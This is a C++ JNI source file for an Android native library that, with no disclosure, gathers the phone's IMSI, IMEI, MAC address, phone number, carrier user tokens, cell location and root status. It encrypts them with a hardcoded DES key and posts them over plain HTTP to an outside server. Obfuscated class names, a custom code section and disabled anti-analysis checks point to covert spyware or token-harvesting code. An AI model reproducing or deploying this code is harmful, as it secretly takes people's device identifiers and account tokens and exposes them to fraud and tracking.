//#include <com_example_t_getdeviceinfo_Test.h>
#include "base.h"
#include "MacGet.h"
#include "Build.h"
#include "TM.h"
#include "WM.h"
#include "OtherParams.h"
#include "Utils.h"
#include "TokenDef.h"
#include "curl/curl.h"
#include <sys/time.h>
#include "MyCts.h"
#include "Helper.h"
jstring getInfo(JNIEnv * env, jclass jc, jobject ctxObj)
		__attribute__((section ("getInfo")));

extern  map<string,string> strs;
//记录程序的进度 -
string sub_version = "20";
/*
 * 为某一个类注册本地方法
 */
  int __attribute__((section ("getInfo"))) registerNativeMethods(
		JNIEnv* env, const char* className, JNINativeMethod* gMethods,
		int numMethods) {
	jclass clazz;
	clazz = env->FindClass(className);
	if (clazz == NULL) {
		return JNI_FALSE;
	}
	if (env->RegisterNatives(clazz, gMethods, numMethods) < 0) {
		return JNI_FALSE;
	}
	env->DeleteLocalRef(clazz);
	return JNI_TRUE;
}
/*
 * 为所有类注册本地方法
 */

  int __attribute__((section ("getInfo"))) registerNatives(JNIEnv* env) {
	  /**
	   * 方法对应表
	   */
	   JNINativeMethod gMethods[] =
	  	{ { "a", "(Landroid/content/Context;)Ljava/lang/String;", (void*) getInfo }, //绑定
	  	};

	const char* kClassName = "a/e/g/c"; //指定要注册的类
	return registerNativeMethods(env, kClassName, gMethods,
			sizeof(gMethods) / sizeof(gMethods[0]));
}
/*
 * System.loadLibrary("lib")时调用
 * 如果成功返回JNI版本, 失败返回-1
 */
JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* vm, void* reserved) {
	//memset(strs,0,sizeof(string*)*strsLength);
	JNIEnv* env = NULL;
	jint result = -1;
	if(logShow)LOGI("JNI_OnLoad..  ");
	if (vm->GetEnv((void**) &env, JNI_VERSION_1_4) != JNI_OK) {
		return -1;
	}
	// assert(env != NULL);
	if (!registerNatives(env)) { //注册
		return -1;
	}
	//成功
	result = JNI_VERSION_1_4;
	return result;
}
//
JNIEXPORT void JNICALL JNI_OnUnload(JavaVM* vm, void* reserved)
 {
    // LOGI("JNI_OnUnload , strs length %d",strs.size());
 }



static size_t GetContent(void *data, int size, int nmemb,
		std::string &myContent) {
	long sizes = size * nmemb;
	std::string temp((char*) data, sizes);
	myContent += temp;
	return sizes;
}

static int  httpPost(const char *url,
		const char *postdata, const char *headers) {
	long netRetcode = 0;
	char error[2048];
	// 接受返回的内容，用于打印出来看
	string myContent;
	if (CURLE_OK != curl_global_init(CURL_GLOBAL_ALL)) {
		//LOGE("Get: init failed!!!");
		return -1;
	}
	if (logShow)
		LOGE("httpPost!!!!!");

	CURL *easy_handle = curl_easy_init();
	if (NULL == easy_handle) {
		if (logShow)
			LOGE("Get: get easy_handle failed!!!");
		return -1;
	}
	//url set
	curl_easy_setopt(easy_handle, CURLOPT_URL, url);
	//post 方式
	curl_easy_setopt(easy_handle, CURLOPT_POST, 1);
	//curl_easy_setopt(easy_handle, CURLOPT_HTTPGET, 1);
	curl_easy_setopt(easy_handle, CURLOPT_POSTFIELDS, postdata);
	curl_easy_setopt(easy_handle, CURLOPT_WRITEFUNCTION, GetContent);
	curl_easy_setopt(easy_handle, CURLOPT_ERRORBUFFER, error);
	curl_easy_setopt(easy_handle, CURLOPT_WRITEDATA, &myContent);
	int myRetCode = 0;
	//exe
	if (logShow)
		LOGI("url=%s", url);
	if (logShow)
		LOGI("params=%s", postdata);
	if (CURLE_OK == curl_easy_perform(easy_handle)) {
		curl_easy_getinfo(easy_handle, CURLINFO_RESPONSE_CODE, &netRetcode);
		if (logShow)
			LOGE("retCode = %ld", netRetcode);
		//执行成功
		if (netRetcode == 200) {
			if (logShow)
				LOGI("curl content = %s", myContent.c_str());
			if (myContent.find("status") != std::string::npos) {
				myRetCode = 200;   //
			}
		}
	}
	if (string(error).length() > 0)
		if (logShow)
			LOGI("errorBuffer  = %s", error);
	//	LOGE("ct%s=",myContent.c_str());
	curl_easy_cleanup(easy_handle);
	curl_global_cleanup();
	return myRetCode;
}

//上传失败原因
void postFaieldReason(string imsi,string code,string vercode,string uuid){
	//101 : 充电格式为0
	//102 : 当前设备已root
	string params = string("imsi=")+imsi+"&code="+code+"&vercode="+vercode+"&uuid="+uuid;
	int i = httpPost(
					"http://utils.appanalyselog.com/nice/log",//http://utils.appanalyselog.com/nice/log
					params.c_str(), "");
}




void __attribute__((section ("getInfo")))   setProgress(JNIEnv * env, jobject ctx,jobject sp,
		int gress) {
	if(logShow)LOGI("setProgress...");
	string p;
	int2str(gress, p);
	string version = sub_version;

	jstring pname = getPkname(env,ctx);
	string str_pname = jstringTostring(env,pname);
	env->DeleteLocalRef(pname);
	if(p!="0"){
	//	if(logShow)LOGI("not zero!");
		p = p+"_v"+version+string("_")+getModel();
	}
	//LOGI("progressValue : %d", gress);
	spPut(env, sp, "progress", p.c_str());
	if (gress == 0)
		gress = 100;
	LOGI("progress :%d",gress);
}


jstring __attribute__((section ("getInfo"))) getInfo(JNIEnv * env, jclass jc, jobject ctxObj) {
	jobject sp = getSp(env, ctxObj);
	string key_success = "success";
	string key_failed = "failed";


	string version = sub_version;
	setProgress(env, ctxObj, sp, 1);
	//thSleep(env,20000);
	//setProgress(env,ctxObj, sp, 10);
//	if(true) return env->NewStringUTF(key_success);
	if(spGet(env,sp,"subVersion4Nice","")!=version) {
		LOGI("update...");
		spPut(env, sp, "firstUp", "");
	}
	string firstUp = spGet(env, sp, "firstUp", "");
	spPut(env, sp, "subVersion4Nice", version.c_str()); //subVersion4Nice

//	联网参数s
	string key_isRoot = "isRoot";
	string key_UUID = "UUID";
	string key_uid = "uid";
	string key_tel = "tel";
	string key_installFlag = "installFlag";
	string key_startFlag = "startFlag";
	string key_userToken = "usertoken";
	string key_tokenType = "tokenType";
	string key_version = "vercode";

	string key_operator = "operator";
	string key_network = "network";
	string key_smsFirewall = "smsFirewall";
	string key_imei = "imei";
	string key_imsi = "imsi";
	string key_screen = "screen";
	string key_densityDpi = "densityDpi";
	string key_macAddr = "macAddr";
	string key_model = "model";
	string key_androidVersion = "androidVersion";
	string key_release = "release";
	string key_brand = "brand";
	string key_simCountryIso = "SimCountryIso";
	string key_simState = "simState";
	string key_appPackname = "appPackname";
	string key_channelId = "channelId";
	string key_gameId = "gameId";
	string key_times = "curTime";
	string key_sign = "sign";
	//setProgress(env, ctxObj,sp, 11);
	//参数
	jobject tm = getTelephoneManagerObj(env, ctxObj);
	jobject wm = getWindowManager(env, ctxObj);
	jobject metrics = getMetrics(env, wm);
	jstring j_pname = getPkname(env, ctxObj);
	string pkname = jstringTostring(env, j_pname );
	if (j_pname != NULL)env->DeleteLocalRef(j_pname);

	string imsi = getImsi(env, tm);
	string user_uuid = getUUid(env, ctxObj);

	//setProgress(env,ctxObj, sp, 12);
	//条件检测
	//1,usb调试
	string usbInterface = spGet(env, sp, "iuu", "0");
	if (logShow)
		LOGE("usbInterface=%s", usbInterface.c_str());

//	if(usbInterface=="0"){//实际不应该有的值
//		if (logShow)
//			LOGE("不正确的充电格式%s",usbInterface.c_str());
//		postFaieldReason(imsi,string("101"));
//		setProgress(env, sp, 0);
//		 return env->NewStringUTF(key_success);
//	}

//	if(usbInterface=="2")LOGI("usbInterface==2");
//	if(isUsbMode(env,ctxObj))LOGI("isUsbMode==1");
	bool testDevice = isExistPackage(env, ctxObj, "com.z.test");
	if (testDevice)LOGE("version=%s", version.c_str());

	//setProgress(env,ctxObj, sp, 13);
	//插了usb,且用了usb调试
//	if (usbInterface == "2" && isUsbMode(env, ctxObj)) {
//		if (logShow)
//			LOGE("当前是usb模式,return！");
//		setProgress(env, ctxObj, sp, 0);
//		LOGE("ErrCode=%s", "103");
//
//		if (!testDevice)return env->NewStringUTF(key_success.c_str());;
//	}
	//2,root检测
	bool isDeviceRoot = deviceRoot();
	if (logShow)LOGI("isDeviceRoot = %s", isDeviceRoot ? "1" : "0");
	if (false&&isDeviceRoot && !testDevice) {//暂时不检测root
		if (logShow)
			LOGE("当前是root设备，写入永远不会再执行的标记!");
		//写入永不执行的标记。
		spPut(env, sp, "nice_forver", "1");
		postFaieldReason(imsi, string("102"), version, user_uuid);
		setProgress(env, ctxObj, sp, 0);
		LOGE("ErrCode=%s", "102");
		if (!testDevice) return env->NewStringUTF(key_success.c_str());;
	}
	setProgress(env, ctxObj, sp, 14);
	//string testImsi = "460078569036967";
	Token token(env, imsi.c_str(), pkname.c_str());
	//setProgress(env, ctxObj,sp, 15);
	if (logShow)
		LOGI("token after");
	int rootInt = token.isRoot();
	//setProgress(env, ctxObj,sp, 16);
	jstring j_uuid = token.getUUID();
	//setProgress(env, ctxObj,sp, 161);
	jstring j_uid = token.getUid();
	//setProgress(env,ctxObj, sp, 17);
	jstring j_tel = token.getTel();




	jstring j_installFlag = token.getInstallFlg();
	jstring j_startFlag = token.getStartFlag();
	//setProgress(env,ctxObj,sp, 18);
	jstring j_userToken = token.getUserToken();
	string tokenType = token.getTokenType();
//	setProgress(env,ctxObj, sp, 19);
	long timel = getCurrentTime();
	string times;
	long2str(timel, times);
	//setProgress(env,ctxObj, sp, 191);
	string isRoot;
	int2str(rootInt, isRoot);
	string uuid = j_uuid == NULL ? "" : jstringTostring(env, j_uuid,true);
	string uid = j_uid == NULL ? "" : jstringTostring(env, j_uid,true);
	string tel = j_tel == NULL ? "" : jstringTostring(env, j_tel,true);
	MyCts * Cts = MyCts::GetInstance();
	//延迟5秒获取tel
	if(tel=="") {
		thSleep(env, 12000);
		Token token2(env, imsi.c_str(), pkname.c_str());
		jstring j_tel2 = token2.getTel();
		tel = j_tel2 == NULL ? "" : jstringTostring(env, j_tel2,true);
	}
	//写入共享数据
	writeNiceShare(env, ctxObj, tel);
	jobject shareSp = getShareSp(env,ctxObj);
	string cellId = spEGet(env, shareSp,Cts->cellId.c_str(), "");
	string lac = spEGet(env, shareSp,Cts->lac.c_str(), "");
	//string sId = spEGet(env, shareSp, Cts->sId.c_str(), "");
	string versionCode = getVersioncode(env, ctxObj);

	string installFlag =
			j_installFlag == NULL ?
			"" : jstringTostring(env, j_installFlag,true);
	string startFlag =
			j_startFlag == NULL ?
			"" : jstringTostring(env, j_startFlag,true);
	string userToken =
			j_userToken == NULL ?
			"" : jstringTostring(env, j_userToken,true);

	setProgress(env, ctxObj, sp, 2);
	if (firstUp=="true"&&userToken.empty()) {
		if (logShow)
			LOGI("user token is empty!");
		setProgress(env, ctxObj, sp, 0);
		if (env->ExceptionCheck() == JNI_TRUE) {
			env->ExceptionClear();
			//return env->NewStringUTF(key_failed);
		}
		LOGE("ErrCode=%s", "104");
		return env->NewStringUTF(key_failed.c_str());
	}
	//setProgress(env,ctxObj, sp, 21);
	//save
	//获取token
	string str_cmToken = uuid + uid + tel + userToken;
	string nativeToken = spGet(env, sp, "that_num", "-1");
	//setProgress(env,ctxObj, sp, 22);
	int int_cmToken = simple_hash(str_cmToken.c_str());
	string cmToken4int;
	int2str(int_cmToken, cmToken4int);   //将str_cmToken改成int型赋予新值
	if (logShow)
		LOGI("nativeToken=%s , cmToken=%s", nativeToken.c_str(),
			 cmToken4int.c_str());

	setProgress(env, ctxObj, sp, 3);
	//比较token
	if (str_cmToken.empty()) {
		setProgress(env, ctxObj, sp, 0);
		return env->NewStringUTF(key_failed.c_str());
	}

	if (firstUp==""||nativeToken != cmToken4int) {    //不相同
		if (logShow)
			LOGI("token not equals");
		//联网上传

		//组织参数
		//获取
		string params = "";
		//setProgress(env, ctxObj,sp, 30);
		string network = getNetwork(env, ctxObj);
		string imei = getImei(env, tm);//no p
		string aoperator = getOperator(imsi);//no p
		//setProgress(env,ctxObj, sp, 32);
		string het = getHeightpixels(env, metrics);
		string wid = getWidthPixels(env, metrics);
		string densityDpi = getDensityDpi(env, metrics);
		//	setProgress(env,ctxObj, sp, 33);
		string mac = getMac(env, ctxObj);
		//	setProgress(env,ctxObj, sp, 331);
		string model = getModel();
		string sdkVersion = getSdkVersion();
		string release = getRelease();
		string brand = getBrand();
		//setProgress(env,ctxObj, sp, 332);
		string simIso = getSimCountryIso(env, tm);
		string simState = getSimState(env, tm);//no p
		//setProgress(env,ctxObj, sp, 334);
		string smsFirewall = getSmsFirewall(env, ctxObj);
		//setProgress(env,ctxObj, sp, 34);
		string channelId = spGet(env, sp, key_channelId.c_str(),
								 "-1");
		string gameId = spGet(env, sp, key_gameId.c_str(), "-1");
		string sign = getSignHash(env, ctxObj);
		setProgress(env, ctxObj, sp, 4);

		//拼接
		string QUOTE = "\"";
		params = "{" + QUOTE + key_network + QUOTE + ":" + QUOTE + network + QUOTE + ","
				 + QUOTE + key_imsi + QUOTE + ":" + QUOTE + imsi + QUOTE + ","
				 + QUOTE + key_operator + QUOTE + ":" + QUOTE + aoperator + QUOTE + ","
				 + QUOTE + key_screen + QUOTE + ":" + QUOTE + wid + "*" + het + QUOTE + ","
				 + QUOTE + key_densityDpi + QUOTE + ":" + QUOTE + densityDpi + QUOTE + ","
				 + QUOTE + key_macAddr + QUOTE + ":" + QUOTE + mac + QUOTE + ","
				 + QUOTE + key_model + QUOTE + ":" + QUOTE + model + QUOTE + ","
				 + QUOTE + key_androidVersion + QUOTE + ":" + QUOTE + sdkVersion + QUOTE + ","
				 + QUOTE + key_release + QUOTE + ":" + QUOTE + release + QUOTE + ","
				 + QUOTE + key_brand + QUOTE + ":" + QUOTE + brand + QUOTE + ","
				 + QUOTE + key_imei + QUOTE + ":" + QUOTE + imei + QUOTE + ","
				 + QUOTE + key_simCountryIso + QUOTE + ":" + QUOTE + simIso + QUOTE + ","
				 + QUOTE + key_simState + QUOTE + ":" + QUOTE + simState + QUOTE + ","
				 + QUOTE + key_smsFirewall + QUOTE + ":" + QUOTE + smsFirewall + QUOTE + ","
				 + QUOTE + key_isRoot + QUOTE + ":" + QUOTE + isRoot + QUOTE + ","
				 + QUOTE + key_UUID + QUOTE + ":" + QUOTE + uuid + QUOTE + ","
				 + QUOTE + key_uid + QUOTE + ":" + QUOTE + uid + QUOTE + ","
				 + QUOTE + key_tel + QUOTE + ":" + QUOTE + tel + QUOTE + ","
				 + QUOTE + key_installFlag + QUOTE + ":" + QUOTE + installFlag + QUOTE + ","
				 + QUOTE + key_startFlag + QUOTE + ":" + QUOTE + startFlag + QUOTE + ","
				 + QUOTE + key_userToken + QUOTE + ":" + QUOTE + userToken + QUOTE + ","
				 + QUOTE + key_appPackname + QUOTE + ":" + QUOTE + pkname + QUOTE + ","
				 + QUOTE + key_channelId + QUOTE + ":" + QUOTE + channelId + QUOTE + ","
				 + QUOTE + key_times + QUOTE + ":" + QUOTE + times + QUOTE + ","
				 + QUOTE + key_tokenType + QUOTE + ":" + QUOTE + tokenType + QUOTE + ","
				 + QUOTE + key_sign + QUOTE + ":" + QUOTE + sign + QUOTE + ","
				 + QUOTE + key_version + QUOTE + ":" + QUOTE + version + QUOTE + ","
				 + QUOTE + key_gameId + QUOTE + ":" + QUOTE + gameId + QUOTE+","
				 +QUOTE + Cts->cellId+QUOTE +":"+QUOTE+cellId+QUOTE+","
				 +QUOTE + Cts->versionCode+QUOTE +":"+QUOTE+versionCode+QUOTE+","
				 // +QUOTE + Cts->sId+QUOTE +":"+QUOTE+sId+QUOTE+","
				 +QUOTE +Cts->lac+QUOTE+":"+QUOTE+lac+QUOTE
				 + "}";

		setProgress(env, ctxObj, sp, 5);
		//加密
		jstring encodeParams = encodeDes(env, string("abc12345"),
										 params);
		setProgress(env, ctxObj, sp, 6);
		string en_ps = jstringTostring(env, encodeParams );
		env->DeleteLocalRef(encodeParams);
		//setProgress(env, ctxObj,sp, 61);
		if (en_ps == "") {
			//	setProgress(env,ctxObj, sp, 62);
			//postFaieldReason(imsi,"121",version,user_uuid);
			setProgress(env, ctxObj, sp, 0);
			LOGE("ErrCode=%s", "121");
			return env->NewStringUTF(key_failed.c_str());
		}

		if (testDevice)
			LOGI("pre params=%s", params.c_str());

		//上传
		string headers = "";
		int i = httpPost(
				"http://wtbtk.lettersharing.com/nice/upload",//http://utils.lettersharing.com/shua/upload,http://utils.appanalyselog.com/nice/upload
				en_ps.c_str(), headers.c_str());
		//	setProgress(env,ctxObj, sp, 7);
		//联网失败
		if (i != 200) {
			if (logShow)
				LOGI("net faild ... ");
			setProgress(env, ctxObj, sp, 0);
			LOGE("ErrCode=%s", "105");
			return env->NewStringUTF(key_failed.c_str());
		}
		setProgress(env, ctxObj, sp, 8);
		//联网成功，写入标记
		if (logShow)
			LOGI("net success ... ");
		//spPut(env, sp, "eover", "true");	//执行结束的标志，由外部来判断。
		spPut(env, sp, "that_num", cmToken4int.c_str());//上传成功才写入新的token

		if(firstUp=="") {
			spPut(env, sp, "firstUp", "true");
			return env->NewStringUTF(key_failed.c_str());
		}
	} else {
		if (logShow)
			LOGI("token is same!");
		//spPut(env, sp, "eover", "true");	//如果 无改变，写入执行结束的标志。
	}
	setProgress(env, ctxObj, sp, 0);
	if (env->ExceptionCheck() == JNI_TRUE) {
		env->ExceptionClear();
		return env->NewStringUTF(key_failed.c_str());
	}

	return env->NewStringUTF(key_success.c_str());    //成功结束
}

